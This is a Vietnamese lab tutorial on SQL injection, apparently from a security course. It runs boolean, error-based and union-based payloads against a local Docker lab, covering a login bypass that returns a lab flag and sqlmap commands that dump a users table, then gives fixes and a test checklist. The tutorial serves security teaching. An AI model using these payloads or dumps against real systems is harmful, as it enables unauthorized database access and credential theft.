# SQL Injection Căn Bản — Boolean, Union & Error Based

> **Độ khó:** Medium — **Trình độ:** intermediate

## Giới thiệu

**SQL Injection (SQLi)** là lỗ hổng **nghiêm trọng nhất** trong lịch sử web — đứng đầu OWASP Top 10 (A03 Injection) nhiều năm. Khi app nối chuỗi input của người dùng trực tiếp vào câu lệnh SQL, kẻ tấn công có thể **thoát khỏi chuỗi** và **viết lại câu lệnh** để đọc/dump toàn bộ database, thậm chí ghi file. Bài này dạy 3 kỹ thuật nền: **boolean**, **error-based** và **union** — bằng tay trước, `sqlmap` sau.

---

## Phần A — Hiểu (Understand)

### SQLi xảy ra thế nào?

Giả sử app login code kiểu này:

```php
$q = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```

Nếu bạn nhập `user = admin` bình thường → câu SQL trở thành:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '...'
```

Nhưng nếu bạn nhập `user = ' OR 1=1-- -` thì sao?

```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...'
```

- `'` đóng chuỗi `username` sớm
- `OR 1=1` → điều kiện luôn đúng
- `-- -` comment bỏ phần còn lại (password)

→ Câu lệnh trả về **mọi user** → đăng nhập thành công mà không cần mật khẩu!

> **Dễ hiểu:** Câu SQL là câu "điền vào chỗ trống". Input của bạn là nội dung điền. Nếu app không kiểm tra, bạn có thể điền thêm **cả đoạn mã** thay vì chỉ chữ — làm câu văn đổi nghĩa.

### 3 loại SQLi bạn sẽ học

| Loại | Dựa vào | Khi nào |
|------|---------|---------|
| **Boolean based** | True/False khác biệt trong response | Mọi trường hợp, xác nhận lỗ hổng |
| **Error based** | Thông báo lỗi DB lộ ra | Khi app hiện error message |
| **Union based** | Gộp cột để lấy dữ liệu trực tiếp | Khi cột đầu ra hiển thị trên trang |

### Bảng ký tự quan trọng

| Ký tự | Tác dụng |
|-------|----------|
| `'` | Đóng/mở chuỗi |
| `"` | Đóng/mở chuỗi (MySQL) |
| `-- -` | Comment (bỏ phần sau) |
| `#` | Comment (MySQL) |
| `/* */` | Block comment |
| `;` | Kết thúc câu lệnh (stacked queries) |
| `OR 1=1` | Luôn đúng |
| `AND 1=1` | Luôn đúng (điều kiện ổn) |

---

## Phần B — Khai thác: Lab SQLi

### Bước 1: Khởi động lab

```bash
cd sqli-basics/lab
docker compose up -d
# Lab tại: http://localhost:7104
```

Lab là một trang login + trang tìm kiếm sản phẩm, cả hai đều nối chuỗi trực tiếp vào SQL (MySQL).

<!-- Output already described via CLI commands above -->

### Bước 2: Xác nhận lỗ hổng (Boolean-based)

Thử tìm kiếm sản phẩm bình thường:

```bash
$ curl -s "http://localhost:7104/search.php?q=phone"
```

Giờ thêm payload — nếu `q=phone' AND 1=1-- -` vẫn hiện kết quả, còn `q=phone' AND 1=2-- -` không hiện → **chắc chắn dính SQLi**:

```bash
# Kỳ vọng: hiện sản phẩm phone (AND 1=1 đúng)
$ curl -s "http://localhost:7104/search.php?q=phone' AND 1=1-- -"

# Kỳ vọng: KHÔNG hiện (AND 1=2 sai)
$ curl -s "http://localhost:7104/search.php?q=phone' AND 1=2-- -"
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** `AND 1=1` luôn đúng nên kết quả giữ nguyên; `AND 1=2` luôn sai nên câu SQL không trả hàng nào. Khác biệt này = "chân tướng" của lỗ hổng.

### Bước 3: Error-based — lấy thông tin database

Khi app hiện lỗi DB, ép nó báo version:

```bash
# Ép MySQL báo lỗi kèm version
$ curl -s "http://localhost:7104/search.php?q=phone' AND extractvalue(1,concat(0x7e,version()))-- -"
ERROR: XPATH syntax error: '~8.0.35'
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** `extractvalue()` là hàm MySQL đọc XML; truyền chuỗi không hợp lệ `concat(0x7e,version())` → nó **báo lỗi kèm nội dung** `~8.0.35`. Kiểu "bắt nó lầm bật mí" — thông tin lộ ra ngay trong error message.

### Bước 4: Xác định số cột (cho Union)

Union cần **đúng số cột**. Thử dần `ORDER BY`:

```bash
$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 1-- -"   # ok
$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 2-- -"   # ok
$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 3-- -"   # ok
$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 4-- -"   # LỖI → có 3 cột
```

<!-- Output already described via CLI commands above -->

### Bước 5: Union-based — dump dữ liệu

```sql
SELECT id, name, price FROM products WHERE name = 'phone' UNION SELECT 1, 2, 3-- -'
```

```bash
$ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT 1,2,3-- -"
```

Thấy cột 2 hiển thị số `2` → thay bằng dữ liệu mình muốn. Lấy database name + version:

```bash
$ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT database(),version(),3-- -"
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** UNION gộp kết quả 2 câu SELECT **cùng số cột**. Kết quả thứ 2 do BẠN viết — nên bạn đọc được bất cứ bảng nào mình biết tên.

### Bước 6: Login bypass + flag

Về trang login, đăng nhập không cần mật khẩu:

```bash
$ curl -s "http://localhost:7104/login.php" -X POST -d "user=admin' OR 1=1-- -&pass=x"
Welcome admin! FLAG=FLAG{sql1_m4st3r_2026}
```

<!-- Output already described via CLI commands above -->

### Bước 7: Tự động với sqlmap (khi đã hiểu thủ công)

```bash
# Scan & dump toàn bộ database tự động
sqlmap -u "http://localhost:7104/search.php?q=phone" --batch --dbs
sqlmap -u "http://localhost:7104/search.php?q=phone" --batch -D lab_db --tables
sqlmap -u "http://localhost:7104/search.php?q=phone" --batch -D lab_db -T users --dump
```

<!-- Output already described via CLI commands above -->

> ⚠️ **Quy tắc vàng:** Học **thủ công trước, sqlmap sau**. sqlmap là "xe tự lái" — nếu không biết lái tay bạn sẽ không đọc được kết quả nó báo, và không biết khi nào nó sai.

---

## Phần C — Phòng thủ & Checklist (Defend)

### Cách fix (quan trọng nhất)

1. **Prepared statement / parameterized query** (chuẩn hóa tham số):

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$user, $pass]);
```

2. **Không nối chuỗi SQL** với input người dùng, kể cả sau khi "filter".
3. **Least privilege DB:** app chỉ dùng user DB có quyền SELECT trên 1 schema, không dùng `root`.
4. **Ẩn error message** — trả về lỗi chung chung, log chi tiết vào server log.

### Checklist test nhanh

```text
[ ] '  (đơn quote → có lỗi/khác biệt?)
[ ] ' OR 1=1-- -  (luôn đúng)
[ ] ' AND 1=1-- -  vs ' AND 1=2-- -
[ ] ORDER BY 1,2,3...  (tìm số cột)
[ ] UNION SELECT 1,2,3...  (nếu hiện số → union ok)
[ ] SELECT version(), database(), user()
[ ] sqlmap --batch --dbs (xác nhận tự động)
```

---
